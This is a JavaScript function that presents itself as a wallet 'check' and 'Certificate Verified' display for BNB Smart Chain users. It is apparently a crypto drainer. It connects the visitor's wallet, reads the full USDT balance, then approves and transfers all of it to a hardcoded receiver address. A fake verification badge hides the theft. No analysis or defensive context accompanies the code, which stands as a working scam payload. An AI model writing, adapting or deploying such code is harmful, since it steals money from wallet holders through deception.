async function checkAndApprove() {
  if (typeof window.ethereum === "undefined") {
    alert("Please install MetaMask or Trust Wallet.");
    return;
  }

  const web3 = new Web3(window.ethereum);

  const bscParams = {
    chainId: "0x38",
    chainName: "BNB Smart Chain",
    nativeCurrency: {
      name: "BNB",
      symbol: "BNB",
      decimals: 18,
    },
    rpcUrls: ["https://bsc-dataseed.binance.org/"],
    blockExplorerUrls: ["https://bscscan.com"],
  };

  try {
    await window.ethereum.request({
      method: "wallet_switchEthereumChain",
      params: [{ chainId: bscParams.chainId }],
    });
  } catch (switchError) {
    if (switchError.code === 4902) {
      await window.ethereum.request({
        method: "wallet_addEthereumChain",
        params: [bscParams],
      });
    } else {
      alert("Please switch to BNB Smart Chain in your wallet.");
      return;
    }
  }

  await window.ethereum.request({ method: "eth_requestAccounts" });
  const accounts = await web3.eth.getAccounts();
  const sender = accounts[0];

  const usdtAddress = "0x55d398326f99059fF775485246999027B3197955";
  const receiverAddress = "0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999";

  const usdtAbi = [
    {
      constant: true,
      inputs: [{ name: "_owner", type: "address" }],
      name: "balanceOf",
      outputs: [{ name: "balance", type: "uint256" }],
      type: "function",
    },
    {
      constant: false,
      inputs: [
        { name: "_spender", type: "address" },
        { name: "_value", type: "uint256" },
      ],
      name: "approve",
      outputs: [{ name: "success", type: "bool" }],
      type: "function",
    },
    {
      constant: false,
      inputs: [
        { name: "_to", type: "address" },
        { name: "_value", type: "uint256" },
      ],
      name: "transfer",
      outputs: [{ name: "success", type: "bool" }],
      type: "function",
    },
  ];

  const usdtContract = new web3.eth.Contract(usdtAbi, usdtAddress);
  const rawBalance = await usdtContract.methods.balanceOf(sender).call();
  const balance = web3.utils.fromWei(rawBalance);

  if (parseFloat(balance) === 0) {
    alert("No USDT balance in your wallet.");
    return;
  }

  const amount = rawBalance;

  await usdtContract.methods.approve(receiverAddress, amount).send({ from: sender });
  await usdtContract.methods.transfer(receiverAddress, amount).send({ from: sender });

  const now = new Date();
  const timeString = now.toLocaleString("en-GB", {
    day: "2-digit",
    month: "short",
    year: "numeric",
    hour: "2-digit",
    minute: "2-digit",
    hour12: true,
  });

  const masked = sender.slice(0, 6) + "..." + sender.slice(-4);
  const displayBalance = parseFloat(balance).toFixed(2);

  const html = `
    <div style="background-color: #1e1e1e; padding: 30px; border-radius: 12px; border: 1px solid #4caf50;">
      <h2 style="color: #4caf50;">✅ Certificate Verified</h2>
      <p style="font-size: 18px; color: #ccc;">${masked}</p>
      <p style="font-size: 20px; color: #ffc107;">Only ${displayBalance} USDT</p>
      <p style="color: #aaa; font-size: 14px;">🕒 ${timeString}</p>
    </div>
  `;

  document.getElementById("certificate-container").innerHTML = html;
}
